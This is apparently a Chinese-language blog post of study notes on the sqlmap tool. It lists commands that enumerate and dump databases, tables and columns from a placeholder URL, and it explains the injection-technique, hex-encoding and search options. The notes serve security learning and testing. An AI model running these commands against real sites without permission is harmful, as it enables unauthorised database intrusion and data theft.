---
layout:     post
title:     工具（一）sqlmap
subtitle:   这个系列是安全相关工具的介绍、参数使用、常用指令等等用法心得体会，有些常用的工具会记得比较细。本章是sqlmap笔记。
date:       2020-12-06
author:     HouKC
header-img: img/home-bg-o.jpg
catalog:    true
tags:
    - 工具
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
---



## 0x00 常用指令

- SQL注入测试，并且按照默认自动完成用户交互。

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch 
```

- 获取当前数据库

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --current-db
```

- 获取所有数据库

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --dbs
```

- 指定数据库类型为MySQL，获取表名

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --dbms "MySQL" -D [数据库名] --tables
```

- 指定库名、表名，获取列名

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --dbms "MySQL" -D [数据库名] -T [表名] --columns
```

- 指定库名、表名、列名，获取数据

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --dbms "MySQL" -D [数据库名] -T [表名] -C "[列名1],[列名2]" --dump
```

- 将HTTP请求内容保存在request.txt文件中，从文件打开，指定使用布尔、时间盲注进行测试

```
sqlmap -r request.txt --batch --current-db --technique BT
```

- 使用最高级别的Payload测试，并且使用一些更具风险（可能影响网站）的Payload，开启线程最大，即10个线程进行测试

```
sqlmap -u http://xxx.com/xxx.php?id=1 --batch --current-db --level 5 --risk 3 --threads 10
```



## 0x01 --technique

sqlmap设置具体SQL注入技术

- --technique T   指明基于时间的盲注（Time-based blind）
- --technique B   指定基于布尔的盲注（Boolean-based blind）
- --technique E   指定报错注入（Error-based）
- --technique U  指定Union查询注入（Union query-based）
- --technique S   指定堆叠注入（Stacked queries）
- --technique Q  指定内联查询注入（Inline queries）
- --technique BT  指定基于时间和布尔（其实就是叠加使用，其他同理）



## 0x02 --hex

对注入的参数进行十六进制编码。

```
sqlmap -u "http://xxx" --hex
```



## 0x03 --search

可以搜索数据库名，在所有数据库中搜索表名，在所有数据库的所有表中搜索列名。

参数“–search”要和下列参数之一配合使用：

- -C：后跟以逗号分隔的列名，在整个数据库管理系统中搜索
- -T：后跟以逗号分隔的表名，在整个数据库管理系统中搜索
- -D：后跟以逗号分隔的库名，在整个数据库管理系统中搜索

在搜索时，Sqlmap会询问用户进行精确搜索还是包含搜索。

默认为包含搜索，即搜索的字符串包含于结果中就认为命中。

精确搜索要求搜索的字符串与结果完全相等。